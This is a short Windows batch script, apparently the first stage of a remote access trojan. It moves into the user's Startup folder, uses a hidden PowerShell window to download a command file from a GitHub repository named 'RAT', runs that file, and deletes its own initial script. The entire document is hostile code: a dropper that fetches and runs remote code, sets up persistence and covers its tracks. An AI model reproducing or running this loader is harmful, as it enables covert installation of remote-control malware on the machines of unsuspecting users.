@echo off
@REM Variable
set "INITIALPATH=%cd%"
set "STARTUP=C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"

@REM move into startup dir
cd "%STARTUP%"

@rem TODO build out stage2
@REM write payload to startup
powershell powershell.exe -windowstyle hidden "Invoke-WebRequest -Uri raw.githubusercontent.com/birbalkr/RAT/master/files/wget.cmd -OutFile wget.cmd"

@rem run playload
powershell .\wget.cmd

@REM back into initial loc
@REM cd "%INITIALPATH%"

@rem del initial.cmd
del initial.cmd